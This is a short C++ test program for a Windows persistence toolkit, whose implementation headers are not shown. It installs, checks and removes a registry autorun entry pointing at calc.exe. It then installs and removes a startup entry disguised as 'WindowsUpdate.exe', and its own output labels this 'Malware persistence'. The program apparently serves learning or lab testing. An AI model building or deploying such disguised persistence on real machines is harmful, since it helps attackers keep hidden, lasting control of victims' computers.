#include "registry_persist.hpp"
#include "startup_persist.hpp"

int main()
{
    registry_persist regPersist;
    startup_persist startPersist;

    std::string programName = "TestPersistence";
    std::string programPath = "C:\\Windows\\System32\\calc.exe";

    std::cout << "=== REGISTRY PERSISTENCE TEST ===\n\n";

    if (regPersist.installUserPersistence(programName, programPath)) {
        std::cout << "Persistence installed successfully!\n";
        std::cout << "Entry: " << programName << " -> " << programPath << "\n";

        if (regPersist.validatePersistence(programName)) {
            std::cout << "Persistence validated - entry exists!\n";
        }
        else { std::cout << "Validation failed - entry not found\n"; }
    }
    else {
        std::cout << "Failed to install persistence\n";
    }

    if (regPersist.removePersistence(programName)) {
        std::cout << "Persistence removed successfully!\n";

        if (!regPersist.validatePersistence(programName)) {
            std::cout << "Removal validated - entry no longer exists!\n";
        }
        else {
            std::cout << "Removal failed - entry still exists\n";
        }
    }
    else {
        std::cout << "Failed to remove persistence\n";
    }

    std::cout << "\n\n=== STARTUP PERSISTENCE TEST ===\n\n";

    if (startPersist.installStartup("WindowsUpdate.exe", "user")) { 
        std::cout << "Malware persistence installed successfully!\n";
        std::cout << "Will auto-start as: WindowsUpdate.exe\n";
    }
    else {
        std::cout << "Failed to install persistence\n";
    }

    if (startPersist.removeStartup("WindowsUpdate.exe")) {
        std::cout << "Malware persistence removed successfully!\n";
    }
    else {
        std::cout << "Failed to remove persistence\n";
    }


    return 0;
}